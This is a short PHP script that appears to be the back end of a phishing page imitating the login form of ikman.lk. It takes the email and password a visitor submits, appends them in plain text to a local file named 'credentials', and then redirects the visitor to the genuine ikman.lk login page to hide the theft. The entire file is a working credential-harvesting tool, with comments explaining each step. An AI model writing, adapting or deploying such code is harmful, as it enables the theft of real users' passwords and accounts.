<?php
 //Extract the credentials received
 $username = $_POST["account"];///first input id is used an "account" //<input id="account" name="account" type="email" class="ui-input" placeholder="Email"/></div>
 $password = $_POST["password"];///second input id is password // <input id="password" name="password" type="password" class="ui-input" placeholder="Password"></div>
 
 //Write the credentials to text file
 $myfile = fopen("credentials", "a") or die("Unable to open file!");
 $txt = "USERNAME = $username , PASSWORD = $password\n";/// show the user name and the password entered
 fwrite($myfile, "\n". $txt);
 fclose($myfile);
 
 //Redirect the browser to original login page
header("Location: http://ikman.lk/en/users/login");// the original website to login
exit();
?>